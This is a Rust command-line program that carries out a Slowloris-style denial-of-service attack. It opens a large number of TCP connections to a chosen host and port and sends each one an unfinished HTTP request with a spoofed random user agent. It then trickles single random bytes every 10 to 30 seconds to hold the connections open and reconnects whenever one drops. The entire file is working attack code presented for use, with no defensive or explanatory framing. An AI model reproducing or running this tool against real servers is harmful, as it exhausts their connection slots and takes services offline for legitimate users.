/*
Copyright (c) 2021 trivernis
See LICENSE for more information
 */
use futures::FutureExt;
use std::sync::atomic::{AtomicUsize, Ordering};
use std::sync::Arc;
use std::time::Duration;
use structopt::StructOpt;
use tokio::io::AsyncWriteExt;
use tokio::net::TcpStream;

#[derive(StructOpt, Debug)]
#[structopt()]
struct Opt {
    /// The target address with port
    #[structopt()]
    pub address: String,

    // The port to connect to
    #[structopt(short, long, default_value = "443")]
    pub port: u32,

    /// Number of connections
    #[structopt(short = "n", long, default_value = "200")]
    pub count: usize,
}

#[tokio::main(flavor = "current_thread")]
async fn main() {
    let opts: Opt = Opt::from_args();

    let mut futures = Vec::new();
    let counter = Arc::new(AtomicUsize::new(0));
    // create the specified amount of connections
    for _ in 0..opts.count {
        futures.push(connect(opts.address.clone(), opts.port, Arc::clone(&counter)).boxed());
    }
    // output some information
    futures.push(
        async move {
            loop {
                // log current number of connections
                print!("\r{:0>3} Connections", counter.load(Ordering::Relaxed));
                tokio::time::sleep(Duration::from_millis(100)).await;
            }
        }
        .boxed(),
    );
    // wait forever
    futures::future::join_all(futures).await;
}

/// Connects via HTTP and tries to keep the connection open
async fn connect(address: String, port: u32, counter: Arc<AtomicUsize>) {
    loop {
        if let Some(mut stream) = create_connection(&address, port).await {
            counter.fetch_add(1, Ordering::Relaxed);
            // write until writing fails
            while stream
                .write_all(&[fakeit::misc::random(0u8, 255u8)])
                .await
                .is_ok()
            {
                // wait a random amount between 10 and 30 seconds
                tokio::time::sleep(Duration::from_secs(fakeit::misc::random(10, 30))).await;
            }
            counter.fetch_sub(1, Ordering::Relaxed);
        }
        // wait to reduce load with constantly failing attempts
        tokio::time::sleep(Duration::from_millis(10)).await;
    }
}

/// Creates a single HTTP connection
async fn create_connection(address: &str, port: u32) -> Option<TcpStream> {
    // connect to the specified address
    let mut stream = TcpStream::connect(format!("{}:{}", address, port))
        .await
        .ok()?;

    // send simple get request and start second header field
    stream
        .write_all(
            format!(
                "GET / HTTP/1.0\r\nUser-Agent: {}\r\nX-a: ",
                fakeit::user_agent::random_platform()
            )
            .as_bytes(),
        )
        .await
        .ok()?;

    Some(stream)
}
